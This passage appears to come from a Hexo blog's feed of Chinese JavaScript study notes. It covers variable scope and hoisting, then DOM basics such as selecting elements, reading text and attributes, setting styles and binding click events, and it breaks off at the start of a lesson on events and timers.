class="comment">//全局：当前页面关闭之后被删除</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//局部：当前函数运行之后被删除</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// tip面试：全局变量多好还是局部变量多好。答：局部多好，全局变量虽然写代码时方便，但是容易占内存，只有等页面关闭时才会被释放</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//释放内存</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//delete，手动删除，但不是所有的变量都可以被删除</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> x=<span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">delete</span>(x);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(x);<span class="comment">//依旧输出说明删除不成功</span></span></span><br><span class="line"><span class="javascript">            x=<span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//这里的x是显示变量，通过var创建的不可以用delete删除，如果删除，可以直接用之前学过的null，将其值设置为null，这也是null存在的意义</span></span></span><br><span class="line">            xx=1;</span><br><span class="line"><span class="javascript">            <span class="keyword">delete</span>(xx);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(xx);<span class="comment">//not defined     </span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//隐式变量可以通过delete直接删除</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="comment">//变量的声明提升</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(xxx);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> xxx=<span class="number">10</span>;<span class="comment">//代码从上往下执行，这里不会报错，会直接显示 undefined</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//如果没有var xxx,则会给出红色报错信息</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//原因是，当使用var时，在加载代码时，会把所有用var声明的变量提升到顶部，但赋值不提升。有点类似于C++中把函数放在main函数之后时就需要在其前面添加函数声明</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="comment">//函数声明提升</span></span></span><br><span class="line">            fun6()</span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">fun6</span>(<span class="params"></span>)</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&quot;函数声明提升&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">              </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 前端 </tag>
            
            <tag> ECMAScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js-DOM专题</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Js-DOM%E4%B8%93%E9%A2%98/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Js-DOM%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="day12-DOM基础"><a href="#day12-DOM基础" class="headerlink" title="day12 DOM基础"></a>day12 DOM基础</h2><h3 id="获取结点-getElementById-getElementsByTagName-getElementsByClass"><a href="#获取结点-getElementById-getElementsByTagName-getElementsByClass" class="headerlink" title="获取结点 getElementById getElementsByTagName  getElementsByClass"></a>获取结点 getElementById getElementsByTagName  getElementsByClass</h3><h3 id="获取属性-src-href用点"><a href="#获取属性-src-href用点" class="headerlink" title="获取属性 .src  .href用点"></a>获取属性 .src  .href用点</h3><h3 id="获取文本-innerHTML-innerText-outerHTML-outerText-value表单"><a href="#获取文本-innerHTML-innerText-outerHTML-outerText-value表单" class="headerlink" title="获取文本 innerHTML  innerText  outerHTML  outerText  value表单"></a>获取文本 innerHTML  innerText  outerHTML  outerText  value表单</h3><h3 id="设置样式-style-width"><a href="#设置样式-style-width" class="headerlink" title="设置样式 .style.width"></a>设置样式 .style.width</h3><h3 id="点击事件-onclick-btn-onclick-function"><a href="#点击事件-onclick-btn-onclick-function" class="headerlink" title="点击事件  onclick  btn.onclick=function(){  }"></a>点击事件  onclick  btn.onclick=function(){  }</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day12 DOM基础<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        .cls1&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: pink;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .cls2&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: yellow;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>第一个p标签中的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p1&quot;</span>&gt;</span>第二个p标签中的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>第一个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;spans&quot;</span>&gt;</span>第二个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;spans&quot;</span>&gt;</span>第三个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:50px;height:50px;background-color:red;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:50px;height:50px;background-color:red;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:50px;height:50px;background-color:red;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>百度一下很好玩<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        属于div内容</span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>属于span的内容<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hhh这是input&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls1&quot;</span>&gt;</span>class1-class2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//DOM 定义访问和处理HTML文档/元素的标准方法，人话：关于如何获取，修改，添加或者删除html元素的标准，可以通过DOM访问html文档里面的所有元素</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//常见的动画效果：倒计时，轮播图，放大镜，下拉菜单，进度条，返回顶部，二级联动，进度条，购物车等</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//结点：DOM将html文档呈现成带有元素，属性，文本的树结构。</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//结点，有文档结点，元素结点（p标签，div，ul，li等）文本结点（文字内容）,属性结点（比如img中的src，alt，a标签中的herf属性等）</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//使用js可以获取结点，并对其进行操作</span></span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="javascript"><span class="comment">//-----------------------------------------------        </span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 获取元素结点3种方法,by_id,class类名，标签名</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//通过ID获取元素，document.getElementById</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> byid=<span class="built_in">document</span>.getElementById(<span class="string">&quot;p1&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(byid);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//通过标签名获取元素</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> bytagname=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;span&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(bytagname);<span class="comment">//返回伪数组，有数组的某些特性，比如下标和length</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(bytagname[<span class="number">0</span>]);<span class="comment">//对伪数组通过下标进行操作</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//通过class类名来获取元素</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> byclassname=<span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;spans&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(byclassname);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(byclassname[<span class="number">0</span>]);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//如果通过标签名或者class名称获取的元素，返回的是伪数组格式，所以即使页面中只有一个元素，如果要对其进行操作，也要使用下标来操作。</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> getdiv=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(getdiv);<span class="comment">//返回伪数组</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> getdiv0=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">0</span>];<span class="comment">//等效写法于在下面console.log(getdiv0[0])添加下标0；</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(getdiv0);<span class="comment">//返回第0个div元素结点；</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//分级获取元素方式</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> uul=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ul&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ool=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ol&quot;</span>)[<span class="number">0</span>];<span class="comment">//如果这里不写[0],那就要在下面olli=ool[0]处添加下标，默认是返回伪数组全部，但是加了下标之后getelement就返回指定下标的结点</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//只操作一个元素时使用下标</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(uul);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ool);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ulli=uul.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> olli=ool.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(ulli);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(olli);</span></span><br><span class="line"><span class="javascript"><span class="comment">//------------------------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取属性</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取a标签</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oa=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;a&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取img标签</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oimg=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;img&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(oa);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(oimg);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(oa.href);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(oimg.src);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取标签下的属性，直接使用点.即可</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//------------------------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取文本结点innerHTML innerText   outerHTML   outerText   value</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取文本之前要先获取元素</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> osp=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;span&quot;</span>)[<span class="number">3</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(osp);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(osp.innerHTML);<span class="comment">//输出span标签内的文字</span></span></span><br><span class="line"><span class="javascript">        osp.innerHTML=<span class="string">&quot;这是修改后的内容&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> odiv=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">3</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(odiv.innerHTML);<span class="comment">//输出div之内的html内容，包括其中的span标签</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(odiv.innerText);<span class="comment">//只输出div中的文字内容，不包含html标签</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(odiv.outerHTML);<span class="comment">//outer会把这里的div标签也输出</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(odiv.outerText);<span class="comment">//outerText和innertext在输出上没啥区别</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(osp.outerHTML);<span class="comment">//outer会把这里的span标签也输出</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(osp.outerText);<span class="comment">//和innerText没啥区别</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//火狐对outerText不支持，会显示undefined，通常用inner</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//value 表单时使用value</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> input=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(input.value);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//value只针对表单获取，其他的是正常元素的文本获取</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//设置样式</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> stydiv=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">4</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(stydiv);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//用style设置样式</span></span></span><br><span class="line"><span class="javascript">        stydiv.style.width=<span class="string">&quot;200px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        stydiv.style.height=<span class="string">&quot;200px&quot;</span>;</span></span><br><span class="line"><span class="javascript">        stydiv.style.background=<span class="string">&quot;red&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//这里设置样式都是在行内的位置设置，在标签内部设置，所以存在和css的优先级问题</span></span></span><br><span class="line"><span class="javascript">        stydiv.style.fontSize=<span class="string">&quot;50px&quot;</span>;<span class="comment">//注意在js中有些元素中间横线消失，font-size变为fontSize</span></span></span><br><span class="line"><span class="javascript">        stydiv.style.backgroundColor=<span class="string">&quot;blue&quot;</span>;<span class="comment">//大小写写错会导致不生效</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//复合写法 cssText  用字符串的拼接</span></span></span><br><span class="line"><span class="javascript">        stydiv.style.cssText=<span class="string">&quot;width:300px;height:200px;background:green;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//classname 控制样式 快速实现从class1到class2两种css样式之间的转换</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> clsdiv=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">5</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(clsdiv);</span></span><br><span class="line"><span class="javascript">        clsdiv.className=<span class="string">&quot;cls2&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//className多用于样式切换，切换的class类名</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//点击事件 onclick 单击</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;button&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        btn.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;这是绑定按钮固定的格式&quot;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(clsdiv.className==<span class="string">&quot;cls2&quot;</span>)&#123;</span></span><br><span class="line"><span class="javascript">                clsdiv.className = <span class="string">&quot;cls1&quot;</span>;</span></span><br><span class="line"><span class="javascript">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">                clsdiv.className = <span class="string">&quot;cls2&quot;</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day13-DOM事件-amp-定时器"><a href="#day13-DOM事件-amp-定时器" class="headerlink" title="day13 DOM事件&amp;定时器"></a>day13 DOM事件&amp;定时器</h2><h3 id="DOM两种事件模型-内联模型-事件属性模型-动态绑定-动态事件分配"><a href="#DOM两种事件模型-内联模型-事件属性模型-动态绑定-动态事件分配" class="headerlink" title="DOM两种事件模型 内联模型/事件属性模型    动态绑定/动态事件分配"></a>DOM两种事件模型 内联模型/事件属性模型    动态绑定/动态事件分配</h3><h3 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h3><h3 id="升级版day6同款末日倒计时"><a href="#升级版day6同款末日倒计时" class="headerlink" title="升级版day6同款末日倒计时"></a>升级版day6同款末日倒计时</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 